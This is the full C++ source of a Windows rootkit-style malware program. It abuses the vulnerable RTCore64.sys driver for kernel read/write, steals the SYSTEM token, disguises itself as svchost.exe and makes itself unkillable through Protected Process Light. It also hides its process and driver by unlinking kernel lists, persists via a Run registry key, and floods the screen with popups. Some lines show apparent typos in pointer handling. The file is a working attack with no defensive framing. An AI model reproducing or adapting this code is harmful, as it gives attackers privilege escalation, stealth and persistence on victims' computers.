// Omega_3r4b.cpp — FINAL
// cl /O2 /MT Omega_3r4b.cpp /Fe:Omega_3r4b.exe /link /SUBSYSTEM:WINDOWS advapi32.lib psapi.lib
// RTCore64.sys in same folder

#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <winternl.h>
#include <psapi.h>
#include <intrin.h>
#include <random>
#include <string>
#include <cstring>
#include <vector>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "psapi.lib")

#define RTC_DEV   "\\.\RTCore64"
#define RTC_READ  0x80002048
#define RTC_WRITE 0x8000204C

struct RTC_REQ { UINT64 Address; UINT64 Buffer; UINT32 Size; UINT32 Pad; };

static HANDLE gRtc = INVALID_HANDLE_VALUE;
static UINT64 gKBase = 0, gPsInit = 0, gSysEproc = 0;
static UINT32 gLinkOff = 0, gPidOff = 0, gNameOff = 0;
static UINT32 gTokenOff = 0, gProtOff = 0;

// ================= kernel R/W =================
static bool kread_raw(UINT64 a, void* o, UINT32 sz) {
if (gRtc == INVALID_HANDLE_VALUE || !o || sz == 0 || sz > 8) return false;
if (a < 0xFFFF800000000000ULL || a > 0xFFFFFFFFFFFFFFF0ULL) return false;
RTC_REQ r = {}; r.Address = a; r.Buffer = (UINT64)o; r.Size = sz;
DWORD b = 0;
if (!DeviceIoControl(gRtc, RTC_READ, &r, sizeof(r), &r, sizeof(r), &b, NULL)) return false;
return b == sizeof(r);
}
static bool kwrite_raw(UINT64 a, const void* i, UINT32 sz) {
if (gRtc == INVALID_HANDLE_VALUE || !i || sz == 0 || sz > 8) return false;
if (a < 0xFFFF800000000000ULL || a > 0xFFFFFFFFFFFFFFF0ULL) return false;
RTC_REQ r = {}; r.Address = a; r.Buffer = (UINT64)i; r.Size = sz;
DWORD b = 0;
if (!DeviceIoControl(gRtc, RTC_WRITE, &r, sizeof(r), &r, sizeof(r), &b, NULL)) return false;
return b == sizeof(r);
}
static bool kr32(UINT64 a, UINT32* o) { UINT32 v = 0; if (!kread_raw(a, &v, 4)) return false; o = v; return true; }
static bool kr64(UINT64 a, UINT64 o) { UINT64 v = 0; if (!kread_raw(a, &v, 8)) return false; o = v; return true; }
static bool kr8(UINT64 a, UINT8 o) { UINT8 v = 0; if (!kread_raw(a, &v, 1)) return false; *o = v; return true; }
static bool kw8(UINT64 a, UINT8 v) { if (!kwrite_raw(a, &v, 1)) return false; UINT8 b = 0; if (!kr8(a, &b)) return false; return b == v; }
static bool kw64v(UINT64 a, UINT64 v) {
if (!kwrite_raw(a, &v, 8)) return false;
UINT64 b = 0; if (!kr64(a, &b)) return false; return b == v;
}
static bool validKptr(UINT64 p) { return p >= 0xFFFF800000000000ULL && p < 0xFFFFFFFFFFFFFFFFULL; }

// ================= kernel base + export =================
typedef NTSTATUS (NTAPI *pQSI)(UINT, PVOID, ULONG, PULONG);

static UINT64 getNtoskrnl() {
auto q = (pQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
if (!q) return 0;
ULONG sz = 0; q(11, NULL, 0, &sz); if (!sz) return 0;
std::vector<BYTE> b(sz);
if (q(11, b.data(), sz, &sz) < 0) return 0;
auto m = (PRTL_PROCESS_MODULES)b.data();
for (DWORD i = 0; i < m->NumberOfModules; i++) {
const char* fn = (const char*)m->Modules[i].FullPathName + m->Modules[i].OffsetToFileName;
if (_stricmp(fn, "ntoskrnl.exe") == 0) return (UINT64)m->Modules[i].ImageBase;
}
return 0;
}

static UINT64 findExport(UINT64 base, const char* name) {
if (!base || !name) return 0;
UINT32 mz = 0; if (!kr32(base, &mz) || mz != 0x5A4D) return 0;
UINT32 pe = 0; if (!kr32(base + 0x3C, &pe)) return 0;
if (!pe || pe > 0x1000) return 0;
UINT32 sig = 0; if (!kr32(base + pe, &sig) || sig != 0x4550) return 0;
UINT32 opt = pe + 24;
UINT32 mw = 0; if (!kr32(base + opt, &mw)) return 0;
UINT16 magic = (UINT16)mw;
UINT32 dd = (magic == 0x20B) ? opt + 112 : (magic == 0x10B) ? opt + 96 : 0;
if (!dd) return 0;
UINT32 er = 0; if (!kr32(base + dd, &er)) return 0;
if (!er || er > 0x10000000) return 0;
UINT64 ea = base + er;
UINT32 nn = 0, nr = 0, orr = 0, fr = 0;
if (!kr32(ea + 24, &nn) || !nn || nn > 20000) return 0;
if (!kr32(ea + 32, &nr) || !kr32(ea + 36, &orr) || !kr32(ea + 28, &fr)) return 0;
if (nr > 0x10000000 || orr > 0x10000000 || fr > 0x10000000) return 0;
for (UINT32 i = 0; i < nn; i++) {
UINT32 nR = 0; if (!kr32(base + nr + i4, &nR)) continue;
if (nR > 0x10000000) continue;
char buf[64] = {0};
for (int j = 0; j < 63; j++) {
UINT32 ch = 0;
if (!kr32(base + nR + (j & ~3), &ch)) break;
char c = (char)((ch >> ((j & 3) * 8)) & 0xFF);
buf[j] = c; if (!c) break;
}
if (strcmp(buf, name) == 0) {
UINT32 oW = 0; if (!kr32(base + orr + i2, &oW)) return 0;
UINT16 ord = (UINT16)oW;
if (ord >= nn) return 0;
UINT32 fR = 0; if (!kr32(base + fr + ord*4, &fR)) return 0;
if (!fR || fR > 0x10000000) return 0;
return base + fR;
}
}
return 0;
}

static bool nameMatch(UINT64 ep, UINT32 no, const char* ex) {
char b[16] = {0};
for (int i = 0; i < 15; i++) {
UINT32 ch = 0;
if (!kr32(ep + no + (i & ~3), &ch)) return false;
char c = (char)((ch >> ((i & 3) * 8)) & 0xFF);
b[i] = c; if (!c) break;
}
return strcmp(b, ex) == 0;
}

// ================= offset discovery =================
static bool validateProcessList(UINT64 sysEp, UINT32 po, UINT32 lo, UINT32 no) {
struct N { const char* n; int f; };
N needs[] = { {"System",0},{"smss.exe",0},{"csrss.exe",0},{"wininit.exe",0},{"services.exe",0},{"lsass.exe",0} };
UINT64 head = sysEp + lo;
UINT64 cur = 0; if (!kr64(head, &cur)) return false;
for (int i = 0; i < 10000; i++) {
if (!validKptr(cur) || cur == head) break;
UINT64 ep = cur - lo;
UINT64 pid = 0;
if (!kr64(ep + po, &pid)) return false;
if (pid == 0 || pid > 0x1000000) return false;
for (int k = 0; k < 6; k++) if (!needs[k].f && nameMatch(ep, no, needs[k].n)) needs[k].f = 1;
if (!kr64(cur, &cur)) return false;
}
if (!needs[0].f) return false;
int t = 0; for (int k = 1; k < 6; k++) t += needs[k].f;
return t >= 4;
}

static bool findProcessOffsets(UINT64 sysEp) {
if (!sysEp) return false;
for (UINT32 po = 0x100; po < 0x800; po += 8) {
UINT64 v = 0;
if (!kr64(sysEp + po, &v)) continue;
if (v != 4) continue;
for (int d = 0; d < 2; d++) {
UINT32 lo = (d == 0) ? po + 8 : po - 8;
if (lo < 0x100) continue;
for (UINT32 no = 0x100; no < 0x800; no += 8) {
if (no == po || no == lo) continue;
if (!nameMatch(sysEp, no, "System")) continue;
if (!validateProcessList(sysEp, po, lo, no)) continue;
gPidOff = po; gLinkOff = lo; gNameOff = no;
return true;
}
}
}
return false;
}

// ================= find Token offset =================
// _EX_FAST_REF: pointer + 4-bit refcount in low bits
// Validate: high bits form valid kernel pointer, low 4 bits <= 0xF
static bool findTokenOffset(UINT64 selfEp) {
for (UINT32 off = 0x100; off < 0x900; off += 8) {
UINT64 v = 0;
if (!kr64(selfEp + off, &v)) continue;
if (!v) continue;
UINT64 tok = v & ~0xFULL;
if (!validKptr(tok)) continue;
// _TOKEN starts with a header — read a DWORD, must not be 0 or 0xFFFFFFFF
UINT32 probe = 0;
if (!kr32(tok, &probe)) continue;
if (probe == 0 || probe == 0xFFFFFFFF) continue;
// sanity: token object should have a non-zero TokenId at offset 0x08
UINT64 tid = 0;
if (!kr64(tok + 0x08, &tid)) continue;
if (tid == 0) continue;
gTokenOff = off;
return true;
}
return false;
}

// ================= find PS_PROTECTION offset =================
// PS_PROTECTION is a single UCHAR, typically 0x00 for normal processes
// Near the end of EPROCESS, after SignatureLevel/SectionSignatureLevel fields
// Try a list of known offsets, verify the byte is 0x00 first
static bool findProtectionOffset(UINT64 selfEp) {
static const UINT32 candidates[] = {
0x87A, // Win10 2004 - Win11 22H2
0x87B,
0x6FA, // Win10 1903-1909
0x6FB,
0x5FA, // Win10 1809
0x6CA, // Win10 1803
0x6B2, // Win10 1709
0x87C,
0x87D,
0x87E,
0x87F,
0x880,
};
for (UINT32 off : candidates) {
UINT8 b = 0xFF;
if (!kr8(selfEp + off, &b)) continue;
if (b == 0x00) {
gProtOff = off;
return true;
}
}
// fallback: scan 0x600-0x900 for a 0x00 byte near known signature fields
for (UINT32 off = 0x600; off < 0x900; off++) {
UINT8 b = 0xFF;
if (!kr8(selfEp + off, &b)) continue;
if (b != 0x00) continue;
// check neighbors — signature levels are typically UCHAR too
UINT8 n1 = 0, n2 = 0;
if (!kr8(selfEp + off - 1, &n1) || !kr8(selfEp + off + 1, &n2)) continue;
if (n1 == 0x00 && n2 == 0x00) {
gProtOff = off;
return true;
}
}
return false;
}

// ================= find EPROCESS by PID =================
static UINT64 findEproc(DWORD pid) {
if (!gSysEproc || !gLinkOff || !gPidOff) return 0;
UINT64 head = gSysEproc + gLinkOff;
UINT64 cur = 0;
if (!kr64(head, &cur)) return 0;
for (int i = 0; i < 10000; i++) {
if (!validKptr(cur) || cur == head) return 0;
UINT64 ep = cur - gLinkOff;
UINT64 v = 0;
if (kr64(ep + gPidOff, &v) && (DWORD)v == pid) return ep;
if (!kr64(cur, &cur)) return 0;
}
return 0;
}

// ================= operations =================
static bool escalateToSystem(UINT64 selfEp) {
if (!selfEp || !gSysEproc || !gTokenOff) return false;
UINT64 sysTok = 0;
if (!kr64(gSysEproc + gTokenOff, &sysTok)) return false;
if (!validKptr(sysTok)) return false;
return kw64v(selfEp + gTokenOff, sysTok);
}

static bool spoofImageName(UINT64 selfEp) {
if (!selfEp || !gNameOff) return false;
const char* fake = "svchost.exe";
UINT64 chunk1 = 0, chunk2 = 0;
memcpy(&chunk1, fake, 8);
memcpy(&chunk2, fake + 8, 4);
if (!kw64v(selfEp + gNameOff, chunk1)) return false;
if (!kw64v(selfEp + gNameOff + 8, chunk2)) return false;
return true;
}

// PS_PROTECTION: 0x61 = PsProtectedTypeLight | PsProtectedSignerWinTcb
// This makes the process a "Protected Process Light" — even Admin can't kill it
static bool setProtection(UINT64 selfEp) {
if (!selfEp || !gProtOff) return false;
return kw8(selfEp + gProtOff, 0x61);
}

static bool unlinkProcess(UINT64 ep) {
if (!ep) return false;
UINT64 la = ep + gLinkOff;
UINT64 f = 0, b = 0;
if (!kr64(la, &f) || !kr64(la + 8, &b)) return false;
if (!validKptr(f) || !validKptr(b)) return false;
if (f == la || b == la) return false;
UINT64 fb = 0, bf = 0;
if (!kr64(f + 8, &fb) || !kr64(b, &bf)) return false;
if (fb != la || bf != la) return false;
if (!kw64v(b, f)) return false;
if (!kw64v(f + 8, b)) return false;
UINT64 nfb = 0, nbf = 0;
if (!kr64(f + 8, &nfb) || !kr64(b, &nbf)) return false;
if (nbf != f || nfb != b) return false;
return true;
}

static bool hideDriver() {
if (!gKBase) return false;
UINT64 psLoaded = findExport(gKBase, "PsLoadedModuleList");
if (!psLoaded) return false;
UINT64 head = 0;
if (!kr64(psLoaded, &head)) return false;
if (!validKptr(head)) return false;
UINT64 cur = 0;
if (!kr64(head, &cur)) return false;
for (int i = 0; i < 1000; i++) {
if (!validKptr(cur) || cur == head) break;
for (UINT32 off = 0x30; off < 0x200; off += 8) {
UINT32 lw = 0;
if (!kr32(cur + off, &lw)) break;
UINT16 len = (UINT16)lw;
UINT16 maxLen = (UINT16)(lw >> 16);
if (len < 6 || len > 400 || len > maxLen || (len & 1)) continue;
UINT64 bp = 0;
if (!kr64(cur + off + 8, &bp) || !validKptr(bp)) continue;
UINT32 probe = 0;
if (!kr32(bp, &probe)) continue;
wchar_t c1 = (wchar_t)(probe & 0xFFFF);
wchar_t c2 = (wchar_t)(probe >> 16);
if (c1 < 0x20 || c1 > 0x7E || c2 < 0x20 || c2 > 0x7E) continue;
wchar_t wname[40] = {0};
UINT32 lim = len / 2;
if (lim > 39) lim = 39;
bool ok = true;
for (UINT32 j = 0; j < lim; j++) {
UINT32 chunk = 0;
if (!kr32(bp + (j & ~1) * 2, &chunk)) { ok = false; break; }
wchar_t c = (wchar_t)((chunk >> ((j & 1) * 16)) & 0xFFFF);
wname[j] = c;
if (!c) break;
}
if (ok && wcsstr(wname, L"RTCore64")) {
UINT64 f = 0, b = 0;
if (kr64(cur, &f) && kr64(cur + 8, &b) && validKptr(f) && validKptr(b)) {
if (kw64v(b, f) && kw64v(f + 8, b)) return true;
}
}
}
UINT64 nxt = 0;
if (!kr64(cur, &nxt)) break;
cur = nxt;
}
return false;
}

// ================= load RTCore64 =================
static bool loadRTC() {
char self[MAX_PATH];
if (!GetModuleFileNameA(NULL, self, MAX_PATH)) return false;
char* p = strrchr(self, '\'); if (!p) return false;
*p = 0;
std::string drv = std::string(self) + "\RTCore64.sys";
if (GetFileAttributesA(drv.c_str()) == INVALID_FILE_ATTRIBUTES) return false;
SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
if (!scm) return false;
SC_HANDLE old = OpenServiceA(scm, "RTCore64", DELETE | SERVICE_STOP);
if (old) { SERVICE_STATUS ss; ControlService(old, SERVICE_CONTROL_STOP, &ss); DeleteService(old); CloseServiceHandle(old); Sleep(300); }
SC_HANDLE svc = CreateServiceA(scm, "RTCore64", "RTCore64",
SERVICE_START | SERVICE_QUERY_STATUS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
SERVICE_ERROR_IGNORE, drv.c_str(), NULL, NULL, NULL, NULL, NULL);
if (!svc) { CloseServiceHandle(scm); return false; }
if (!StartServiceA(svc, 0, NULL)) {
DWORD e = GetLastError();
if (e != ERROR_SERVICE_ALREADY_RUNNING) { CloseServiceHandle(svc); CloseServiceHandle(scm); return false; }
}
bool ok = false;
for (int i = 0; i < 40; i++) {
SERVICE_STATUS ss;
if (QueryServiceStatus(svc, &ss) && ss.dwCurrentState == SERVICE_RUNNING) { ok = true; break; }
Sleep(100);
}
CloseServiceHandle(svc); CloseServiceHandle(scm);
if (!ok) return false;
for (int i = 0; i < 50; i++) {
gRtc = CreateFileA(RTC_DEV, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (gRtc != INVALID_HANDLE_VALUE) return true;
Sleep(100);
}
return false;
}

// ================= persistence =================
static bool persist() {
char self[MAX_PATH];
if (!GetModuleFileNameA(NULL, self, MAX_PATH)) return false;
HKEY hk;
if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_SET_VALUE, &hk) != ERROR_SUCCESS) return false;
LONG r = RegSetValueExA(hk, "WinMgmtSvc", 0, REG_SZ, (const BYTE*)self, (DWORD)strlen(self) + 1);
RegCloseKey(hk);
return r == ERROR_SUCCESS;
}

// ================= hide — full pipeline =================
static bool hideNow() {
if (gRtc == INVALID_HANDLE_VALUE) return false;
gKBase = getNtoskrnl();
if (!gKBase) return false;
gPsInit = findExport(gKBase, "PsInitialSystemProcess");
if (!gPsInit) return false;
if (!kr64(gPsInit, &gSysEproc) || !validKptr(gSysEproc)) return false;
if (!findProcessOffsets(gSysEproc)) return false;
UINT64 self = findEproc(GetCurrentProcessId());
if (!self) return false;

// 1) token to SYSTEM (before hiding, so we survive attempts)  
findTokenOffset(self);  
if (gTokenOff) escalateToSystem(self);  

// 2) ImageFileName to svchost.exe (for any tool that catches us)  
spoofImageName(self);  

// 3) PS_PROTECTION = PPL WinTcb (unkillable by admin)  
findProtectionOffset(self);  
if (gProtOff) setProtection(self);  

// 4) unlink from ActiveProcessLinks (the actual hide — Task Manager blind)  
bool unlinked = unlinkProcess(self);  

// 5) hide our driver from PsLoadedModuleList  
hideDriver();  

return unlinked;

}

// ================= payload =================
static std::mt19937 rng((unsigned)GetTickCount64());
static void spawnWin() {
static const wchar_t* cls = L"3r4bCls";
static bool reg = false;
if (!reg) {
WNDCLASSEXW wc = {sizeof(wc)};
wc.lpfnWndProc = DefWindowProcW;
wc.hInstance = GetModuleHandle(NULL);
wc.lpszClassName = cls;
wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
RegisterClassExW(&wc);
reg = true;
}
int sx = GetSystemMetrics(SM_CXSCREEN), sy = GetSystemMetrics(SM_CYSCREEN);
int x = (int)(rng() % (sx > 420 ? sx - 420 : 1));
int y = (int)(rng() % (sy > 220 ? sy - 220 : 1));
HWND h = CreateWindowExW(WS_EX_TOOLWINDOW|WS_EX_NOACTIVATE|WS_EX_TOPMOST, cls, L"3r4b",
WS_POPUP|WS_VISIBLE|WS_BORDER, x, y, 400, 200, NULL, NULL, GetModuleHandle(NULL), NULL);
if (h) { ShowWindow(h, SW_SHOWNA); UpdateWindow(h); }
}
static void flip() {
HDC dc = GetDC(NULL);
int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
HBRUSH br = CreateSolidBrush(RGB(rng()%256, rng()%256, rng()%256));
RECT r = {0,0,w,h}; FillRect(dc, &r, br); DeleteObject(br); ReleaseDC(NULL, dc);
}

// ================= main =================
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
if (loadRTC()) {
hideNow();
}
persist();
for (int i = 0; i < 400; i++) {
spawnWin();
if (i % 3 == 0) flip();
Sleep(1000);
}
return 0;
}
